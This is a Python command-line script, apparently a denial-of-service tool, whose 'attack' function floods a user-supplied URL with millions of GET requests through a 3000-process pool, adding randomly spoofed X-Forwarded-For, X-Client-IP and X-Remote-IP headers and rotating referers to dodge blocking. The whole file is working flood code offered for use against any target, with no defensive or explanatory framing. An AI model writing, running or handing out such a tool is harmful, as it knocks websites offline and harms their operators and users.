from multiprocessing import Pool
import urllib.parse, ssl
import sys, getopt, random, time, os
import requests

def read_user_agents():
    with open('useragents.txt', 'r') as f:
        user_agents = f.readlines()
    return [ua.strip() for ua in user_agents]

def read_referers():
    with open('referers.txt', 'r') as f:
        referers = f.readlines()
    return [referer.strip() for referer in referers]

def attack(url):
    user_agents = read_user_agents()
    referers = read_referers()

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Referer': random.choice(referers),
        'Connection': 'keep-alive',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Keep-Alive': '300',
        'X-Requested-With': 'XMLHttpRequest',
        'DNT': '1',
        'X-Forwarded-For': '.'.join(map(str, (random.randint(0, 255) for _ in range(4)))),
        'X-Forwarded-Proto': 'https',
        'X-Client-IP': '.'.join(map(str, (random.randint(0, 255) for _ in range(4)))),
        'X-Remote-IP': '.'.join(map(str, (random.randint(0, 255) for _ in range(4)))),
        'X-Host': url.split('//')[-1].split('/')[0],
        # Adicione outros headers conforme necessário
    }

    try:
        for _ in range(2000):
            with Pool(3000) as pool:
                pool.map(send_request, [(url, headers)] * 5000)
    except requests.exceptions.RequestException as e:
        print(f"Error sending request to {url}: {e}")

def send_request(args):
    url, headers = args
    try:
        response = requests.get(url, headers=headers)
        print(f"Sent request to {url} with User-Agent: {headers['User-Agent']} and Referer: {headers['Referer']}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending request to {url}: {e}")

def main(argv):
    target_url = ''

    try:
        opts, args = getopt.getopt(argv, "hu:", ["url="])
    except getopt.GetoptError:
        print('Usage: script.py -u <target_url>')
        sys.exit(2)
    
    for opt, arg in opts:
        if opt == '-h':
            print('Usage: script.py -u <target_url>')
            sys.exit()
        elif opt in ("-u", "--url"):
            target_url = arg

    if not target_url:
        print('Usage: script.py -u <target_url>')
        sys.exit(2)

    attack(target_url)

if __name__ == '__main__':
    main(sys.argv[1:])